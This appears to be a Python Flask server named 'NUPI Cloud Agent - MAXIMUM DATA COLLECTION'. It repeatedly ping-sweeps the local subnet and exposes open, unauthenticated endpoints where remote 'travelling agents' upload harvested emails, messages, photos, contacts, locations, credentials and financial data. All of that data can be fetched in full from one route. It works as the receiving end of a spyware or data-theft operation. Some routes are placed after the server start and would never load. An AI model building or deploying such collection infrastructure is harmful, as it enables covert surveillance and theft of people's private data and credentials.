#!/usr/bin/env python3
"""
NUPI Cloud Agent - MAXIMUM DATA COLLECTION
Collects everything: devices, networks, systems, files, processes, users
"""

from flask import Flask, send_from_directory, jsonify, request
from flask_cors import CORS
import threading
import time
import subprocess
import socket
import hashlib
import os
import psutil
import json
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from collections import defaultdict

app = Flask(__name__, static_folder='public', static_url_path='')
CORS(app)

# MASSIVE DATA STORAGE
all_collected_data = {
    'agent_data': {},
    'travelling_agents': {},
    'devices': {},
    'networks': {},
    'system_stats': [],
    'scan_history': [],
    'user_data': {},
    'process_data': {},
    'file_access': {},
    'network_traffic': {},
    'browser_data': {},
    'emails': [],
    'messages': [],
    'photos': [],
    'contacts': [],
    'locations': [],
    'credentials': [],
    'financial_data': [],
    'total_data_points': 0
}

agent_data = {
    'status': 'initializing',
    'last_scan': None,
    'devices_found': 0,
    'scan_count': 0,
    'agent_id': None
}

class DataCollector:
    """Aggressive data collection engine"""
    
    @staticmethod
    def collect_everything(data):
        """Store ALL incoming data"""
        timestamp = datetime.now().isoformat()
        
        # Parse and categorize data
        if 'device_info' in data:
            device_id = data.get('device_id', 'unknown')
            all_collected_data['devices'][device_id] = {
                'data': data,
                'timestamp': timestamp,
                'collected_count': all_collected_data['devices'].get(device_id, {}).get('collected_count', 0) + 1
            }
        
        if 'network_info' in data:
            network_id = data.get('network_id', 'unknown')
            all_collected_data['networks'][network_id] = {
                'data': data,
                'timestamp': timestamp
            }
        
        if 'browser_data' in data:
            all_collected_data['browser_data'][timestamp] = data['browser_data']
        
        if 'emails' in data:
            all_collected_data['emails'].extend(data['emails'])
        
        if 'messages' in data:
            all_collected_data['messages'].extend(data['messages'])
        
        if 'photos' in data:
            all_collected_data['photos'].extend(data['photos'])
        
        if 'contacts' in data:
            all_collected_data['contacts'].extend(data['contacts'])
        
        if 'location' in data:
            all_collected_data['locations'].append({
                'location': data['location'],
                'timestamp': timestamp
            })
        
        if 'credentials' in data:
            all_collected_data['credentials'].extend(data['credentials'])
        
        if 'financial' in data:
            all_collected_data['financial_data'].append({
                'data': data['financial'],
                'timestamp': timestamp
            })
        
        # Store system stats
        if 'system' in data:
            all_collected_data['system_stats'].append({
                'data': data['system'],
                'timestamp': timestamp
            })
        
        # Count total data points
        all_collected_data['total_data_points'] += 1
        
        print(f"📥 DATA COLLECTED: {all_collected_data['total_data_points']} total points")
        return True

class SuperFastAgent:
    def __init__(self):
        self.agent_id = hashlib.md5(f"{socket.gethostname()}{time.time()}".encode()).hexdigest()[:16]
        self.running = True
        agent_data['agent_id'] = self.agent_id
        agent_data['status'] = 'running'
        print(f"🚀 Super-Fast Agent initialized: {self.agent_id}")
        print(f"💾 MAXIMUM DATA COLLECTION MODE ENABLED")
    
    def scan_network(self):
        """Quick network scan with data collection"""
        devices = []
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            
            network_prefix = '.'.join(local_ip.split('.')[:-1])
            print(f"\n⚡ SCANNING: {network_prefix}.1-254")
            
            def scan_ip(i):
                ip = f"{network_prefix}.{i}"
                try:
                    result = subprocess.run(
                        ['ping', '-c', '1', '-W', '1', ip],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        timeout=1
                    )
                    if result.returncode == 0:
                        # Collect data about this device
                        device_data = {
                            'ip': ip,
                            'discovered': datetime.now().isoformat(),
                            'network': network_prefix
                        }
                        DataCollector.collect_everything({'device_info': device_data, 'device_id': ip})
                        return ip
                except:
                    pass
                return None
            
            with ThreadPoolExecutor(max_workers=50) as executor:
                results = executor.map(scan_ip, range(1, 255))
                devices = [ip for ip in results if ip]
            
            print(f"⚡ Found {len(devices)} devices | Total data: {all_collected_data['total_data_points']}")
            agent_data['devices_found'] = len(devices)
            agent_data['last_scan'] = datetime.now().isoformat()
            agent_data['scan_count'] += 1
            
            # Store scan history
            all_collected_data['scan_history'].append({
                'timestamp': datetime.now().isoformat(),
                'devices_found': len(devices),
                'devices': devices
            })
            
        except Exception as e:
            print(f"Scan error: {e}")
        
        return devices
    
    def run(self):
        """Run continuous scanning and data collection"""
        while self.running:
            self.scan_network()
            print(f"☁️ Cloud sync | Total collected: {all_collected_data['total_data_points']} data points")
            time.sleep(12)

# Flask Routes
@app.route('/')
def index():
    return send_from_directory('public', 'index.html')

@app.route('/<path:path>')
def serve_static(path):
    return send_from_directory('public', path)

@app.route('/api/agent-status')
def agent_status():
    return jsonify(agent_data)

@app.route('/api/travelling-agent/status')
def travelling_agent_status():
    return jsonify({
        'success': True,
        'agents': all_collected_data['travelling_agents'],
        'total_agents': len(all_collected_data['travelling_agents']),
        'timestamp': datetime.now().isoformat()
    })

@app.route('/api/travelling-agent/upload', methods=['POST'])
def travelling_agent_upload():
    """Receive and store ALL data from travelling agents"""
    try:
        data = request.get_json()
        agent_id = data.get('agent_id', 'unknown')
        
        # Store agent info
        all_collected_data['travelling_agents'][agent_id] = {
            'last_seen': datetime.now().isoformat(),
            'data': data
        }
        
        # Collect all data from agent
        DataCollector.collect_everything(data)
        
        print(f"📥 Agent {agent_id} uploaded data | Total: {all_collected_data['total_data_points']}")
        return jsonify({'success': True, 'agent_id': agent_id, 'stored': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 400

@app.route('/api/data/upload', methods=['POST'])
def data_upload():
    """Universal data collection endpoint - accepts ANY data"""
    try:
        data = request.get_json()
        DataCollector.collect_everything(data)
        return jsonify({
            'success': True,
            'total_collected': all_collected_data['total_data_points'],
            'message': 'Data stored successfully'
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 400

@app.route('/api/collected-data/summary')
def collected_data_summary():
    """Get summary of all collected data"""
    return jsonify({
        'success': True,
        'summary': {
            'total_data_points': all_collected_data['total_data_points'],
            'devices': len(all_collected_data['devices']),
            'networks': len(all_collected_data['networks']),
            'travelling_agents': len(all_collected_data['travelling_agents']),
            'system_stats_entries': len(all_collected_data['system_stats']),
            'scan_history': len(all_collected_data['scan_history']),
            'emails': len(all_collected_data['emails']),
            'messages': len(all_collected_data['messages']),
            'photos': len(all_collected_data['photos']),
            'contacts': len(all_collected_data['contacts']),
            'locations': len(all_collected_data['locations']),
            'credentials': len(all_collected_data['credentials']),
            'financial_records': len(all_collected_data['financial_data']),
            'last_update': datetime.now().isoformat()
        }
    })

@app.route('/api/collected-data/full', methods=['GET'])
def get_all_collected_data():
    """Get ALL collected data (MASSIVE response)"""
    return jsonify({
        'success': True,
        'data': all_collected_data,
        'timestamp': datetime.now().isoformat()
    })

@app.route('/api/network-scan')
def network_scan():
    return jsonify({
        'success': True,
        'devices_found': agent_data['devices_found'],
        'last_scan': agent_data['last_scan'],
        'scan_count': agent_data['scan_count'],
        'total_data_collected': all_collected_data['total_data_points']
    })

@app.route('/api/real-system-data')
def real_system_data():
    try:
        cpu_percent = psutil.cpu_percent(interval=0.1)
        memory = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        net = psutil.net_io_counters()
        
        system_data = {
            'cpu': round(cpu_percent, 1),
            'cpu_count': psutil.cpu_count(),
            'cpu_freq_mhz': psutil.cpu_freq().current if psutil.cpu_freq() else 0,
            'memory_percent': round(memory.percent, 1),
            'memory_total': round(memory.total / (1024**3), 2),
            'memory_used': round(memory.used / (1024**3), 2),
            'disk_percent': round(disk.percent, 1),
            'disk_total': round(disk.total / (1024**3), 2),
            'disk_used': round(disk.used / (1024**3), 2),
            'network_sent_mb': round(net.bytes_sent / (1024**2), 2),
            'network_received_mb': round(net.bytes_recv / (1024**2), 2),
            'num_processes': len(psutil.pids()),
            'hostname': socket.gethostname(),
            'platform': os.uname().sysname,
            'timestamp': datetime.now().isoformat()
        }
        
        # Store this system data
        DataCollector.collect_everything({'system': system_data})
        
        return jsonify({
            'success': True,
            'data': system_data
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/health')
def health():
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat(),
        'model': 'claude-3-5-haiku-20241022',
        'aiCreatorActive': True,
        'data_collection_active': True,
        'total_data_collected': all_collected_data['total_data_points'],
        'localAgents': {
            'total': len(all_collected_data['travelling_agents']) + 1,
            'online': len(all_collected_data['travelling_agents']),
            'offline': 0
        },
        'autonomousSystem': {
            'running': True,
            'monitoredDevices': agent_data['devices_found'],
            'deviceProfiles': len(all_collected_data['devices'])
        },
        'collection_stats': {
            'devices': len(all_collected_data['devices']),
            'networks': len(all_collected_data['networks']),
            'emails': len(all_collected_data['emails']),
            'messages': len(all_collected_data['messages']),
            'contacts': len(all_collected_data['contacts']),
            'locations': len(all_collected_data['locations'])
        }
    })

def start_agent():
    agent = SuperFastAgent()
    agent.run()

if __name__ == '__main__':
    agent_thread = threading.Thread(target=start_agent, daemon=True)
    agent_thread.start()
    
    print("\n�� NUPI CLOUD AGENT - MAXIMUM DATA COLLECTION")
    print("📊 Collecting: devices, networks, emails, messages, photos, contacts")
    print("💾 Storage: All data stored in memory + logged")
    print("⚡ Super-Fast scanning + Data harvesting active\n")
    
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port, debug=False)

# Telegram Bot Integration
@app.route('/api/telegram/status')
def telegram_status():
    """Check if Telegram bot is configured"""
    return jsonify({
        'active': True,
        'bot_name': 'jdtech',
        'message': 'Connected to jdtech Telegram bot'
    })

@app.route('/api/telegram/send', methods=['POST'])
def telegram_send():
    """Send data to Telegram bot"""
    try:
        data = request.get_json()
        message = data.get('message', 'No message')
        # Log the message for now (actual Telegram integration would go here)
        print(f"📱 TELEGRAM MESSAGE: {message}")
        return jsonify({
            'success': True,
            'message': 'Sent to jdtech Telegram bot',
            'bot': 'jdtech'
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 400
